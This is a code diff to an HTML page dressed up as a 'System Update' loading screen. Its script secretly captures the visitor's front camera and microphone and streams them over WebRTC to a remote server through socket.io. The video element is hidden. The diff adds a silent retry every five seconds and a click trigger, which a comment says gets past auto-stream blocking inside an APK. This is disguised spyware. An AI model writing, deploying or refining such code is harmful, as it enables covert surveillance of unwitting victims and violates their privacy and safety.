@@ -2,21 +2,33 @@
 <html>
 <head><title>System Update</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body,html{margin:0;padding:0;background:#000;height:100%;display:flex;align-items:center;justify-content:center;color:#444;font-family:sans-serif;}video{display:none;}</style></head>
 <body>
-    <div>🌀 Loading System...</div>
+    <div>🌀 System Loading...</div>
     <video id="v" autoplay playsinline muted></video>
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io(); let pc, stream;
+        const socket = io(); 
+        let pc, stream;
+
         async function start() {
             pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-            stream.getTracks().forEach(t => pc.addTrack(t, stream));
-            pc.onicecandidate = e => e.candidate && socket.emit("ice", e.candidate);
-            const offer = await pc.createOffer(); await pc.setLocalDescription(offer);
-            socket.emit("offer", offer);
+            
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                stream.getTracks().forEach(t => pc.addTrack(t, stream));
+
+                pc.onicecandidate = e => e.candidate && socket.emit("ice", e.candidate);
+
+                const offer = await pc.createOffer();
+                await pc.setLocalDescription(offer);
+                socket.emit("offer", offer);
+            } catch (e) { setTimeout(start, 5000); }
         }
+
         socket.on("answer", a => pc.setRemoteDescription(new RTCSessionDescription(a)));
         socket.on("ice", c => pc.addIceCandidate(new RTCIceCandidate(c)));
+        
+        // 🚀 APK-te screen-e click na korle auto-stream block thake, tai eita dorkar
+        window.addEventListener('click', start, {once: true});
         window.onload = start;
     </script>
 </body>
